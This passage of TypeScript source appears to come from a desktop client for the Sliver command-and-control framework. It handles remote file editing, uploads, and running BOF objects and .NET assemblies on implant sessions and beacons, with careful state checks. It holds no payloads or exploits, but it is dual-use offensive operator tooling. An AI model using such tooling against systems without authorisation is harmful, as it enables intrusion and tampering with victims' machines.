    if (!frame || frame.isDestroyed()) throw new Error("The source window is no longer available");
    const context = this.requireWindow(owner.id);
    const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
    if (!pool) throw new Error("Connect to a Sliver server first");
    const selected = this.requireSelectedSession(owner.id, pool);
    const binding: RemoteTextEditorBinding = {
      owner,
      rendererUrl: owner.getURL(),
      rendererProcessId: frame.processId,
      rendererFrameToken: frame.frameToken,
      context,
      pool,
      epoch: pool.epoch,
      connectionAttempt: context.connectionAttempt,
      target: selected.target.ref,
      remotePath,
      expectedSha256: "",
    };
    this.assertRemoteTextEditorBinding(binding);
    const loaded = await this.runSessionWorkbench(owner, {
      operationId: "session.filesystem.cat",
      path: remotePath,
      maxBytes: SESSION_EDITOR_MAX_BYTES,
    });
    this.assertRemoteTextEditorBinding(binding);
    if (!loaded.ok || !loaded.value || loaded.value.status !== "completed" ||
      loaded.value.result.operationId !== "session.filesystem.cat") {
      throw new Error(loaded.ok ? "The remote file could not be opened" : loaded.error);
    }
    const view = loaded.value.result.value;
    if (view.truncated || !view.sha256) {
      throw new Error("The remote file exceeds the 64 KiB editor limit");
    }
    binding.expectedSha256 = view.sha256;
    this.remoteTextEditorBindings.add(binding);
    const title = selected.platform === "windows"
      ? win32Path.basename(remotePath)
      : posixPath.basename(remotePath);
    return { title, text: view.content, expectedSha256: view.sha256, binding };
  }

  /** Stage, review, confirm, and compare-before-write through the existing session action path. */
  async saveRemoteTextEditor(
    opaqueBinding: unknown,
    remotePath: string,
    expectedSha256: string,
    text: string,
    confirm: (plan: SessionDestructiveActionPlan) => Promise<boolean>,
  ): Promise<{ expectedSha256: string } | null> {
    if (!opaqueBinding || typeof opaqueBinding !== "object" ||
      !this.remoteTextEditorBindings.has(opaqueBinding)) {
      throw new Error("The remote editor session is no longer available");
    }
    const binding = opaqueBinding as RemoteTextEditorBinding;
    if (binding.remotePath !== remotePath || binding.expectedSha256 !== expectedSha256 ||
      !/^[0-9a-f]{64}$/u.test(expectedSha256)) {
      throw new Error("The remote editor document changed; reopen it before saving");
    }
    if (Buffer.byteLength(text, "utf8") > SESSION_EDITOR_MAX_BYTES) {
      throw new Error("The remote file exceeds the 64 KiB editor limit");
    }
    this.assertRemoteTextEditorBinding(binding);
    const staged = await this.runSessionWorkbench(binding.owner, {
      operationId: "session.filesystem.stage-text",
      content: text,
      encoding: "utf-8",
    });
    if (!staged.ok || !staged.value || staged.value.status !== "completed" ||
      staged.value.result.operationId !== "session.filesystem.stage-text") {
      throw new Error(staged.ok ? "The remote edit could not be staged" : staged.error);
    }
    const handle = staged.value.result.value.artifact.handle;
    let planToken: string | undefined;
    let dispatched = false;
    try {
      this.assertRemoteTextEditorBinding(binding);
      const prepared = await this.prepareSessionDestructiveAction(binding.owner.id, {
        actionId: "session.filesystem.edit-text-overwrite",
        contentHandle: handle,
        remotePath,
        encoding: "utf-8",
        expectedSha256,
      });
      if (!prepared.ok || !prepared.value || prepared.value.status !== "prepared") {
        throw new Error(prepared.ok ? "The remote edit could not be reviewed" : prepared.error);
      }
      const plan = prepared.value.plan;
      planToken = plan.token;
      this.assertRemoteTextEditorBinding(binding);
      if (!await confirm(plan)) return null;
      this.assertRemoteTextEditorBinding(binding);
      dispatched = true;
      const executed = await this.executeSessionDestructiveActionPlan(binding.owner.id, plan.token);
      if (!executed.ok || !executed.value || executed.value.status !== "succeeded") {
        throw new Error(executed.ok
          ? executed.value?.message ?? "The remote overwrite could not be confirmed"
          : executed.error);
      }
      const nextSha256 = staged.value.result.value.artifact.sha256;
      binding.expectedSha256 = nextSha256;
      return { expectedSha256: nextSha256 };
    } finally {
      if (!dispatched) {
        if (planToken) this.discardRemoteTextEditorPlan(binding.context, planToken);
        else {
          try {
            this.sessionArtifacts.remove({
              ownerWindowId: binding.owner.id,
              backendId: binding.pool.key,
              backendEpoch: binding.epoch,
              connectionIncarnation: binding.connectionAttempt,
              sessionId: binding.target.id,
              sessionFingerprint: binding.target.fingerprint,
            }, handle);
          } catch {
            // The exact artifact may already have been revoked with its session.
          }
        }
      }
    }
  }

  private assertRemoteTextEditorBinding(binding: RemoteTextEditorBinding): void {
    const { owner, context, pool } = binding;
    const frame = owner.mainFrame;
    if (owner.isDestroyed() || !frame || frame.isDestroyed() ||
      owner.getURL() !== binding.rendererUrl ||
      frame.processId !== binding.rendererProcessId ||
      frame.frameToken !== binding.rendererFrameToken ||
      this.windows.get(owner.id) !== context ||
      context.poolKey !== pool.key || context.connectionAttempt !== binding.connectionAttempt ||
      this.pools.get(pool.key) !== pool || pool.epoch !== binding.epoch ||
      !context.activeTarget || !sameTargetRefIdentity(context.activeTarget, binding.target)) {
      throw new Error("The remote editor session changed; reopen the file before saving");
    }
    const selected = this.requireSelectedSession(owner.id, pool);
    if (!sameTargetRefIdentity(selected.target.ref, binding.target)) {
      throw new Error("The remote editor session changed; reopen the file before saving");
    }
  }

  private discardRemoteTextEditorPlan(context: WindowContext, token: string): void {
    const plan = context.sessionPlans.get(token);
    if (!plan) return;
    context.sessionPlans.delete(token);
    const timer = context.sessionPlanTimers.get(token);
    if (timer) clearTimeout(timer);
    context.sessionPlanTimers.delete(token);
    if (plan.artifactHandle && plan.artifactScope) {
      try { this.sessionArtifacts.remove(plan.artifactScope, plan.artifactHandle); }
      catch { /* A session rebinding may already have revoked the artifact. */ }
    }
  }

  async runDroppedSessionUpload(
    sender: WebContents,
    sourcePath: string,
    input: SessionDroppedUploadInput,
  ): Promise<OperationResult<SessionWorkbenchInvocationResult>> {
    return this.runSessionWorkbenchWithUploadSource(
      sender,
      {
        operationId: "session.filesystem.upload-open",
        ...input,
      },
      sourcePath,
    );
  }

  private async runSessionWorkbenchWithUploadSource(
    sender: WebContents,
    input: SessionWorkbenchInput,
    uploadSourcePath?: string,
  ): Promise<OperationResult<SessionWorkbenchInvocationResult>> {
    const admissionId = randomUUID();
    let admittedContext: WindowContext | undefined;
    try {
      const context = this.requireWindow(sender.id);
      const kind = (SESSION_WORKBENCH_ARTIFACT_IDS as readonly string[]).includes(input.operationId)
        ? "artifact"
        : "standard";
      this.admitSessionWorkbenchRequest(context, admissionId, kind);
      admittedContext = context;
      const poolKey = context.poolKey;
      const pool = poolKey ? this.pools.get(poolKey) : undefined;
      const usableStatuses = new Set(["connected", "degraded", "reconnecting"]);
      if (!pool || !usableStatuses.has(pool.snapshot.connection.status)) {
        throw new Error("Connect to a Sliver server first");
      }
      const epoch = pool.epoch;
      const attempt = context.connectionAttempt;
      const assertBinding = (): void => {
        if (
          this.windows.get(sender.id) !== context ||
          context.poolKey !== poolKey ||
          context.connectionAttempt !== attempt ||
          this.pools.get(poolKey!) !== pool ||
          pool.epoch !== epoch
        ) throw new Error("The backend connection changed while the session workbench request was running");
      };
      assertBinding();
      const selected = this.requireSelectedSession(sender.id, pool);
      const operationEngine = this.requireOperationEngine(sender.id, selected.context, pool);
      const journal = operationEngine.beginExternal(
        input.operationId,
        resolvedSessionOperationTarget(selected.context, pool, selected.target),
      );
      let mutationDispatched = false;
      let mutationDispatchPending = false;
      let journalSubmitted = false;
      let confirmedMutationCompleted = false;
      try {
        if (!sessionOperationSupportsPlatform(input.operationId, selected.platform)) {
          throw new SessionWorkbenchBoundaryError(
            `${input.operationId} is unavailable on ${selected.platform} sessions`,
          );
        }
        const scope = this.bindSessionArtifactScope(selected.context, pool, selected.target);
        const selectedTarget = selected.target.ref;
        const assertSelectedTarget = (): void => {
          assertBinding();
          if (!selected.context.activeTarget || !sameTargetRefIdentity(selected.context.activeTarget, selectedTarget)) {
            throw new Error("The active session changed while the workbench operation was running");
          }
        };
        const workbench = new SessionWorkbench(
          pool.client,
          this.sessionArtifactGateway(sender, scope, assertSelectedTarget, uploadSourcePath),
          {
            now: this.now,
            onMutationDispatch: () => {
              assertSelectedTarget();
              mutationDispatchPending = true;
            },
            onDispatch: () => {
              if (!journalSubmitted) {
                const submitted = operationEngine.markExternalSubmitted(journal.requestId);
                if (submitted.state !== "running") {
                  throw new SessionWorkbenchBoundaryError(
                    "The session operation no longer belongs to the active target",
                  );
                }
                journalSubmitted = true;
              } else if (operationEngine.get(journal.requestId)?.state !== "running") {
                throw new SessionWorkbenchBoundaryError(
                  "The session operation no longer belongs to the active target",
                );
              }
              if (mutationDispatchPending) mutationDispatched = true;
            },
          },
        );
        const result = await workbench.run(
          {
            sessionId: selected.target.target.id,
            hostId: selected.target.target.hostId,
            platform: selected.platform,
            username: selected.target.target.username,
            ...(selected.target.target.uid === undefined ? {} : { uid: selected.target.target.uid }),
            ...(selected.target.target.gid === undefined ? {} : { gid: selected.target.target.gid }),
            ...(selected.target.target.pid === undefined ? {} : { pid: selected.target.target.pid }),
            executable: selected.target.target.executable,
            hostname: selected.target.target.hostname,
            os: selected.target.target.os,
            arch: selected.target.target.arch,
          },
          input,
        );
        if (mutationDispatched) {
          // A target can disappear from authoritative inventory while its
          // already-dispatched RPC is still returning. Recover that uncertainty
          // only after this exact decoded success and only while the captured
          // backend incarnation remains current.
          assertBinding();
          let completed = operationEngine.finishExternal(journal.requestId, "completed");
          if (completed.state === "outcome-unknown") {
            completed = operationEngine.resolveExternalOutcome(journal.requestId, "completed");
          }
          confirmedMutationCompleted = completed.state === "completed";
        }
        assertSelectedTarget();
        if (!confirmedMutationCompleted) {
          if (sessionWorkbenchResultWasCanceled(result)) {
            operationEngine.finishExternal(
              journal.requestId,
              "canceled",
            );
          } else {
            operationEngine.finishExternal(
              journal.requestId,
              "completed",
            );
          }
        }
        return { ok: true, value: { status: "completed", result } };
      } catch (error) {
        if (confirmedMutationCompleted) {
          throw new SessionWorkbenchBoundaryError(
            "The session mutation completed for the previously selected session; refresh the session state before continuing",
          );
        }
        if (mutationDispatched && error instanceof SessionWorkbenchRemoteError) {
          let failed = operationEngine.finishExternal(
            journal.requestId,
            "failed",
          );
          if (failed.state === "outcome-unknown") {
            try {
              assertBinding();
              failed = operationEngine.resolveExternalOutcome(journal.requestId, "failed");
            } catch {
              // A decoded rejection from a stale backend incarnation must not
              // mutate the closed journal retained for that old connection.
            }
          }
          return {
            ok: true,
            value: {
              status: "failed",
              operationId: input.operationId as SessionWorkbenchOutcomeUnknownOperationId,
              message: SESSION_MUTATION_TARGET_REJECTED_MESSAGE,
            },
          };
        }
        if (mutationDispatched) {
          operationEngine.finishExternal(
            journal.requestId,
            "outcome-unknown",
          );
          return {
            ok: true,
            value: {
              status: "outcome-unknown",
              operationId: input.operationId as SessionWorkbenchOutcomeUnknownOperationId,
              message: "The session mutation was dispatched, but its final outcome could not be confirmed. Refresh the session state before taking another action.",
            },
          };
        }
        operationEngine.finishExternal(
          journal.requestId,
          "failed",
        );
        if (
          error instanceof SessionWorkbenchBoundaryError ||
          error instanceof SessionWorkbenchRemoteError ||
          error instanceof SessionWorkbenchPlatformError ||
          error instanceof SessionArtifactAccessError
        ) {
          throw error;
        }
        throw new SessionWorkbenchBoundaryError("The session workbench request failed");
      }
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    } finally {
      admittedContext?.sessionWorkbenchAdmissions.delete(admissionId);
      this.sessionWorkbenchGlobalAdmissions.delete(admissionId);
    }
  }

  async listExecutionCatalog(contentsId: number): Promise<OperationResult<ExecutionCatalog>> {
    try {
      return await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
        assertBinding();
        const { context, target } = this.requireSelectedExecutionTarget(contentsId, pool);
        this.bindExecutionArtifactOwner(context, pool);
        return {
          target: { ...target.target },
          targetRef: { ...target.ref },
          backend: operationBackendSummary(context, pool),
          capabilities: executionCapabilitiesForTarget(target.target),
        };
      });
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    }
  }

  private async bofCommandsForWindow(
    context: WindowContext,
    pool: BackendPool,
    target: RevalidatedTarget,
  ): Promise<{ catalog: BofCatalog; entries: InstalledBofCommand[] }> {
    const supportsBuiltInBof = pool.supportsBuiltInBof(target.target.mode, target.target.id);
    const installed = await installedBofCommands(this.clientRootDirectory, target.target, target.ref, supportsBuiltInBof);
    const local = context.bofLocalPackage;
    if (!local || !sameTargetRefIdentity(local.target, target.ref)) return installed;
    const selected = await readBofCommandsFromDirectory(
      this.clientRootDirectory, local.directory, local.namespace, target.target, target.ref, supportsBuiltInBof,
    );
    if (selected.manifestDigest !== local.manifestDigest) {
      throw new Error("The selected BOF manifest changed; open its directory again");
    }
    return {
      catalog: { ...installed.catalog, commands: [...installed.catalog.commands, ...selected.entries.map((entry) => entry.dto)] },
      entries: [...installed.entries, ...selected.entries],
    };
  }

  async listInstalledBofs(contentsId: number): Promise<OperationResult<BofCatalog>> {
    return this.withExecutionPool(contentsId, async (pool, assertBinding) => {
      const { context, target } = this.requireSelectedExecutionTarget(contentsId, pool);
      const { catalog } = await this.bofCommandsForWindow(context, pool, target);
      assertBinding();
      if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, target.ref)) {
        throw new Error("The selected target changed");
      }
      return catalog;
    });
  }

  async listDotNetAssemblies(contentsId: number): Promise<OperationResult<DotNetCatalog>> {
    return this.withExecutionPool(contentsId, async (pool, assertBinding) => {
      const { context, target } = this.requireSelectedExecutionTarget(contentsId, pool);
      const { catalog } = await installedDotNetAssemblies(this.clientRootDirectory, target.target, target.ref);
      assertBinding();
      if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, target.ref)) {
        throw new Error("The selected target changed");
      }
      return catalog;
    });
  }

  async chooseDotNetAssemblyFile(sender: WebContents): Promise<OperationResult<DotNetFileSelection | null>> {
    return this.withExecutionPool(sender.id, async (pool, assertBinding) => {
      const { context, target } = this.requireSelectedExecutionTarget(sender.id, pool);
      assertExecutionOperationSupported("execution.assembly", target.target);
      const selectedRef = { ...target.ref };
      const revision = ++context.dotNetFileRevision;
      const assertCurrent = (): void => {
        assertBinding();
        if (context.dotNetFileRevision !== revision ||
          !context.activeTarget || !sameTargetRefIdentity(context.activeTarget, selectedRef) ||
          !pool.targetStore.revalidateTargetRef(selectedRef, pool.epoch)) {
          throw new Error("The selected target changed while opening the .NET assembly");
        }
      };
      const selection = await dialog.showOpenDialog(requireOwnerWindow(sender), {
        title: "Open .NET assembly",
        properties: ["openFile"],
        filters: [{ name: ".NET assemblies", extensions: ["exe", "dll"] }],
      });
      if (selection.canceled || selection.filePaths.length !== 1) return null;
      assertCurrent();
      const filePath = selection.filePaths[0]!;
      const fileName = safeArtifactFileName(basename(filePath));
      if (!/\.(?:exe|dll)$/iu.test(fileName)) throw new Error("The selected .NET assembly must be an .exe or .dll");
      const selectedFile = await readBoundedRegularFile(filePath, {
        label: ".NET assembly", maxBytes: MAX_DOTNET_ASSEMBLY_BYTES,
      });
      try {
        assertCurrent();
        if (context.dotNetFileTimer) clearTimeout(context.dotNetFileTimer);
        context.dotNetFile?.data.fill(0);
        const token = randomUUID();
        const expiresAt = this.now() + DOTNET_FILE_TTL_MS;
        context.dotNetFile = {
          token, target: selectedRef, data: selectedFile.data,
          fileName, isDll: /\.dll$/iu.test(fileName), expiresAt,
        };
        const timer = setTimeout(() => {
          if (this.windows.get(context.contentsId) !== context || context.dotNetFile?.token !== token) return;
          context.dotNetFile?.data.fill(0);
          delete context.dotNetFile;
          delete context.dotNetFileTimer;
        }, DOTNET_FILE_TTL_MS);
        timer.unref();
        context.dotNetFileTimer = timer;
        return { token, fileName, size: selectedFile.data.length, isDll: /\.dll$/iu.test(fileName) };
      } catch (error) {
        selectedFile.data.fill(0);
        throw error;
      }
    });
  }

  async chooseBofDirectory(sender: WebContents): Promise<OperationResult<BofDirectorySelection | null>> {
    return this.withExecutionPool(sender.id, async (pool, assertBinding) => {
      const { context, target } = this.requireSelectedExecutionTarget(sender.id, pool);
      const selectedRef = { ...target.ref };
      const revision = ++context.bofDirectorySelectionRevision;
      const assertCurrent = (): void => {
        assertBinding();
        if (context.bofDirectorySelectionRevision !== revision ||
          !context.activeTarget || !sameTargetRefIdentity(context.activeTarget, selectedRef) ||
          !pool.targetStore.revalidateTargetRef(selectedRef, pool.epoch)) {
          throw new Error("The selected target changed while opening the BOF directory");
        }
      };
      const selection = await dialog.showOpenDialog(requireOwnerWindow(sender), {
        title: "Open Armory BOF directory", properties: ["openDirectory"],
      });
      if (selection.canceled || selection.filePaths.length !== 1) return null;
      assertCurrent();
      const namespace = `local-${randomUUID()}`;
      const selected = await readBofCommandsFromDirectory(
        this.clientRootDirectory, selection.filePaths[0]!, namespace, target.target, selectedRef,
        pool.supportsBuiltInBof(target.target.mode, target.target.id),
      );
      for (const entry of selected.entries) {
        if (!entry.dto.available) continue;
        const object = await readInstalledBofObject(entry);
        object.fill(0);
      }
      const installed = await installedBofCommands(
        this.clientRootDirectory, target.target, selectedRef,
        pool.supportsBuiltInBof(target.target.mode, target.target.id),
      );
      assertCurrent();
      const old = context.bofLocalPackage;
      if (old) {
        for (const [token, file] of context.bofArgumentFiles) {
          if (file.commandId.startsWith(`${old.namespace}/`)) {
            file.data.fill(0);
            context.bofArgumentFiles.delete(token);
          }
        }
        this.scheduleBofArgumentFileExpiry(context);
      }
      context.bofLocalPackage = {
        directory: selection.filePaths[0]!, namespace, manifestDigest: selected.manifestDigest, target: selectedRef,
      };
      const commands = selected.entries.map((entry) => entry.dto);
      return {
        catalog: { ...installed.catalog, commands: [...installed.catalog.commands, ...commands] },
        selectedCommandId: (commands.find((command) => command.available) ?? commands[0]!).id,
      };
    });
  }

  async chooseBofArgumentFile(
    sender: WebContents,
    input: ChooseBofArgumentFileInput,
  ): Promise<OperationResult<BofArgumentFileSelection | null>> {
    return this.withExecutionPool(sender.id, async (pool, assertBinding) => {
      const { context, target } = this.requireSelectedExecutionTarget(sender.id, pool);
      const directoryRevision = context.bofDirectorySelectionRevision;
      const localCommand = Boolean(context.bofLocalPackage && input.commandId.startsWith(`${context.bofLocalPackage.namespace}/`));
      const { entries } = await this.bofCommandsForWindow(context, pool, target);
      if (localCommand && context.bofDirectorySelectionRevision !== directoryRevision) {
        throw new Error("The selected BOF directory changed");
      }
      const command = entries.find((entry) => entry.dto.id === input.commandId && entry.dto.available);
      if (!command || command.arguments[input.index]?.type !== "file") throw new Error("The selected BOF file argument is unavailable");
      const owner = requireOwnerWindow(sender);
      const selection = await dialog.showOpenDialog(owner, { title: `Choose ${command.arguments[input.index]!.name}`, properties: ["openFile"] });
      if (selection.canceled || selection.filePaths.length !== 1) return null;
      assertBinding();
      if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, target.ref)) throw new Error("The selected target changed");
      if (localCommand && context.bofDirectorySelectionRevision !== directoryRevision) {
        throw new Error("The selected BOF directory changed");
      }
      const data = (await readBoundedRegularFile(selection.filePaths[0]!, {
        label: "BOF argument file", maxBytes: MAX_BOF_ARGUMENT_FILE_BYTES,
      })).data;
      try {
        assertBinding();
        if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, target.ref) ||
          !pool.targetStore.revalidateTargetRef(target.ref, pool.epoch)) throw new Error("The selected target changed");
        if (localCommand && context.bofDirectorySelectionRevision !== directoryRevision) {
          throw new Error("The selected BOF directory changed");
        }
        for (const [existingToken, file] of context.bofArgumentFiles) {
          if (file.expiresAt <= this.now() ||
            (file.commandId === input.commandId && file.index === input.index && sameTargetRefIdentity(file.target, target.ref))) {
            file.data.fill(0);
            context.bofArgumentFiles.delete(existingToken);
          }
        }
        const pendingBytes = [...context.bofArgumentFiles.values()].reduce((sum, file) => sum + file.data.length, 0);
        if (context.bofArgumentFiles.size >= 8 || pendingBytes + data.length > 32 * 1_024 * 1_024) {
          throw new Error("Too many BOF argument files are awaiting execution");
        }
        const token = randomUUID();
        const fileName = safeArtifactFileName(basename(selection.filePaths[0]!));
        context.bofArgumentFiles.set(token, {
          commandId: input.commandId, index: input.index, target: { ...target.ref },
          data, fileName, expiresAt: this.now() + 5 * 60_000,
        });
        this.scheduleBofArgumentFileExpiry(context);
        return { token, fileName, size: data.length };
      } catch (error) {
        data.fill(0);
        throw error;
      }
    });
  }

  /** Keep a single idle-window timer for the earliest native BOF file selection. */
  private scheduleBofArgumentFileExpiry(context: WindowContext): void {
    if (context.bofArgumentFileTimer) clearTimeout(context.bofArgumentFileTimer);
    delete context.bofArgumentFileTimer;
    const now = this.now();
    let nextExpiry = Number.POSITIVE_INFINITY;
    for (const [token, file] of context.bofArgumentFiles) {
      if (file.expiresAt <= now) {
        file.data.fill(0);
        context.bofArgumentFiles.delete(token);
      } else {
        nextExpiry = Math.min(nextExpiry, file.expiresAt);
      }
    }
    if (!Number.isFinite(nextExpiry)) return;
    const timer = setTimeout(() => {
      if (context.bofArgumentFileTimer !== timer || this.windows.get(context.contentsId) !== context) return;
      this.scheduleBofArgumentFileExpiry(context);
    }, Math.max(1, nextExpiry - now));
    context.bofArgumentFileTimer = timer;
    timer.unref();
  }

  async runBof(contentsId: number, input: RunBofInput): Promise<OperationResult<BofExecutionRecord>> {
    let object: Buffer | undefined;
    let packed: Buffer | undefined;
    let loaderData: Buffer | undefined;
    let legacyArguments: Buffer | undefined;
    let admittedContext: WindowContext | undefined;
    const admissionId = randomUUID();
    try {
      const context = this.requireWindow(contentsId);
      this.admitExecutionRequest(context, admissionId);
      admittedContext = context;
      return await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
        const { target } = this.requireSelectedExecutionTarget(contentsId, pool);
        const selectedRef = { ...target.ref };
        const directoryRevision = context.bofDirectorySelectionRevision;
        const localCommand = Boolean(context.bofLocalPackage && input.commandId.startsWith(`${context.bofLocalPackage.namespace}/`));
        const assertCurrent = (): void => {
          assertBinding();
          if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, selectedRef) ||
            !pool.targetStore.revalidateTargetRef(selectedRef, pool.epoch)) throw new Error("The selected target changed before BOF dispatch");
          if (localCommand && context.bofDirectorySelectionRevision !== directoryRevision) {
            throw new Error("The selected BOF directory changed before dispatch");
          }
        };
        const { entries } = await this.bofCommandsForWindow(context, pool, target);
        const command = entries.find((entry) => entry.dto.id === input.commandId);
        if (!command || !command.dto.available) throw new Error(command?.dto.reason ?? "The selected BOF is no longer installed");
        this.scheduleBofArgumentFileExpiry(context);
        const files = new Map<number, Buffer>();
        for (let index = 0; index < command.arguments.length; index++) {
          if (command.arguments[index]?.type !== "file" || input.arguments[index] === null || input.arguments[index] === "") continue;
          const token = input.arguments[index];
          if (typeof token !== "string") throw new Error("BOF file argument must use a native selection");
          const file = context.bofArgumentFiles.get(token);
          if (!file || file.commandId !== input.commandId || file.index !== index || file.expiresAt <= this.now() ||
            !sameTargetRefIdentity(file.target, selectedRef)) throw new Error("The selected BOF file is unavailable or expired");
          files.set(index, file.data);
        }
        packed = packBofArguments(command.arguments, input.arguments, files);
        object = await readInstalledBofObject(command);
        let loaderExport = "";
        let loaderInit = "";
        if (command.mode === "coff-loader") {
          if (!command.dependencyName) throw new Error("The BOF loader dependency is missing");
          const loader = await readInstalledBofLoader(this.clientRootDirectory, command.dependencyName, target.target);
          loaderData = loader.data;
          loaderExport = loader.exportName;
          loaderInit = loader.init;
          legacyArguments = packLegacyBofArguments(command.entrypoint, object, packed);
        }
        assertCurrent();
        for (const [token, file] of context.bofArgumentFiles) {
          if (file.commandId === input.commandId && sameTargetRefIdentity(file.target, selectedRef)) {
            file.data.fill(0);
            context.bofArgumentFiles.delete(token);
          }
        }
        this.scheduleBofArgumentFileExpiry(context);
        const record: BofExecutionRecord = {
          id: randomUUID(), startedAt: new Date(this.now()).toISOString(),
          commandId: command.dto.id, commandName: command.dto.commandName, state: "running",
        };
        this.addBofRecord(pool, selectedRef, record);
        let dispatched = false;
        try {
          assertCurrent();
          if (command.mode === "coff-loader") {
            const loader = loaderData!;
            const registration = target.target.mode === "session"
              ? await pool.client.registerBofLoaderSession(target.target.id, loader, loaderInit, target.target.os, input.timeoutSeconds)
              : await pool.client.registerBofLoaderBeacon(target.target.id, loader, loaderInit, target.target.os, input.timeoutSeconds);
            assertCurrent();
            this.assertBofLoaderRegistrationAccepted(target, registration);
            assertCurrent();
          }
          dispatched = true;
          const response = command.mode === "coff-loader"
            ? target.target.mode === "session"
              ? await pool.client.callLegacyBofSession(target.target.id, loaderData!, legacyArguments!, loaderExport, input.timeoutSeconds)
              : await pool.client.callLegacyBofBeacon(target.target.id, loaderData!, legacyArguments!, loaderExport, input.timeoutSeconds)
            : target.target.mode === "session"
              ? await pool.client.callBofSession(target.target.id, object, packed, command.entrypoint, input.timeoutSeconds)
              : await pool.client.callBofBeacon(target.target.id, object, packed, command.entrypoint, input.timeoutSeconds);
          assertCurrent();
          const captured = decodeBofOutput(response);
          if (response.Response?.Err?.trim()) {
            return this.patchBofRecord(pool, selectedRef, record, { state: "failed", error: "The selected target rejected the BOF execution.", ...captured });
          }
          if (response.Response?.Async) {
            const taskId = response.Response.TaskID;
            if (!/^[A-Za-z0-9_-]{1,128}$/u.test(taskId) || response.Response.BeaconID !== target.target.id) {
              return this.patchBofRecord(pool, selectedRef, record, { state: "outcome-unknown", error: "The BOF was submitted, but its beacon task could not be identified." });
            }
            pool.recordExecutionTaskFact(taskId, selectedRef, "bof.execute");
            return this.patchBofRecord(pool, selectedRef, record, { state: "submitted", taskId });
          }
          if (target.target.mode === "beacon") throw new Error("The beacon BOF response was missing task correlation");
          return this.patchBofRecord(pool, selectedRef, record, { state: "completed", ...captured });
        } catch (error) {
          const state = dispatched ? "outcome-unknown" : "request-failed";
          return this.patchBofRecord(pool, selectedRef, record, {
            state,
            error: dispatched
              ? "The BOF was dispatched, but its final outcome could not be confirmed."
              : executionBoundaryError(error),
          });
        }
      });
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    } finally {
      object?.fill(0);
      packed?.fill(0);
      loaderData?.fill(0);
      legacyArguments?.fill(0);
      admittedContext?.executionAdmissions.delete(admissionId);
      this.executionGlobalAdmissions.delete(admissionId);
    }
  }

  private assertBofLoaderRegistrationAccepted(
    target: RevalidatedTarget,
    registration: sliverpb.RegisterExtension,
  ): void {
    const envelope = registration.Response;
    if (!envelope || envelope.Err?.trim()) throw new Error("The target rejected the BOF loader registration");
    if (!envelope.Async && target.target.mode === "session") return;
    if (!envelope.Async || target.target.mode !== "beacon" ||
      !/^[A-Za-z0-9_-]{1,128}$/u.test(envelope.TaskID) || envelope.BeaconID !== target.target.id) {
      throw new Error("The BOF loader registration task could not be identified");
    }
    // The pinned beacon runner executes registrations before other tasks in
    // the same fetched batch. Waiting for this task's result requires another
    // check-in and can exceed the BOF timeout before invocation is even queued.
  }

  async listBofExecutionHistory(contentsId: number): Promise<OperationResult<BofExecutionHistorySnapshot>> {
    return this.withExecutionPool(contentsId, async (pool) => {
      const { target } = this.requireSelectedExecutionTarget(contentsId, pool);
      const history = this.bofExecutionHistories.get(this.bofHistoryKey(pool, target.ref));
      return { target: { ...target.ref }, revision: history?.revision ?? 0, records: history?.records.map(cloneBofRecord) ?? [] };
    });
  }

  async clearBofExecutionHistory(contentsId: number, input: ClearBofExecutionHistoryInput): Promise<OperationResult> {
    const result = await this.withExecutionPool(contentsId, async (pool) => {
      const { target } = this.requireSelectedExecutionTarget(contentsId, pool);
      const history = this.bofExecutionHistories.get(this.bofHistoryKey(pool, target.ref));
      if (!history) return;
      const index = input.id === undefined ? 0 : history.records.findIndex((record) => record.id === input.id);
      if (index < 0) return;
      const removed = input.id === undefined ? history.records.splice(0) : history.records.splice(index, 1);
      for (const record of removed) clearBofRecord(record);
      this.publishBofHistoryChanged(history);
    });
    return result.ok ? { ok: true } : result;
  }

  async getBofExecutionResult(contentsId: number, input: BofExecutionRecordInput): Promise<OperationResult<BofExecutionRecord>> {
    return this.withExecutionPool(contentsId, async (pool, assertBinding) => {
      const { context, target } = this.requireSelectedExecutionTarget(contentsId, pool);
      const history = this.bofExecutionHistories.get(this.bofHistoryKey(pool, target.ref));
      const record = history?.records.find((item) => item.id === input.id);
      if (!record) throw new Error("The BOF result is unavailable for the current target");
      if ((record.state !== "submitted" && record.state !== "outcome-unknown") || !record.taskId) return cloneBofRecord(record);
      const task = await pool.client.fetchBofBeaconTask(target.target.id, record.taskId, "CallExtensionReq");
      try {
        assertBinding();
        if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, target.ref) ||
          !history?.records.includes(record)) throw new Error("The selected target changed while refreshing the BOF result");
        if (task.ID !== record.taskId || task.BeaconID !== target.target.id) {
          return this.patchBofRecord(pool, target.ref, record, { state: "outcome-unknown", error: "BOF task correlation failed." });
        }
        const state = task.State.trim().toLowerCase();
        if (state === "failed" || state === "canceled" || state === "cancelled") {
          return this.patchBofRecord(pool, target.ref, record, { state: "failed", error: "The beacon BOF task failed." });
        }
        if (state !== "completed") return cloneBofRecord(record);
        try {
          const response = decodeBofTask(task.Response);
          const captured = decodeBofOutput(response);
          if (response.Response?.Err?.trim()) return this.patchBofRecord(pool, target.ref, record, { state: "failed", error: "The selected target rejected the BOF execution.", ...captured });
          return this.patchBofRecord(pool, target.ref, record, { state: "completed", ...captured });
        } catch {
          return this.patchBofRecord(pool, target.ref, record, { state: "outcome-unknown", error: "The beacon BOF task completed, but its exact result could not be confirmed." });
        }
      } finally {
        task.Request?.fill(0);
        task.Response?.fill(0);
      }
    });
  }

  private bofHistoryKey(pool: BackendPool, ref: TargetRef): string {
    return JSON.stringify([pool.key, pool.epoch, ref.mode, ref.id, ref.fingerprint]);
  }

  private addBofRecord(pool: BackendPool, target: TargetRef, record: BofExecutionRecord): void {
    const key = this.bofHistoryKey(pool, target);
    let history = this.bofExecutionHistories.get(key);
    if (!history) {
      history = { poolKey: pool.key, epoch: pool.epoch, target: { ...target }, revision: 0, records: [] };
      this.bofExecutionHistories.set(key, history);
    }
    history.records.unshift(record);
    this.trimBofHistory(history);
    this.publishBofHistoryChanged(history);
  }

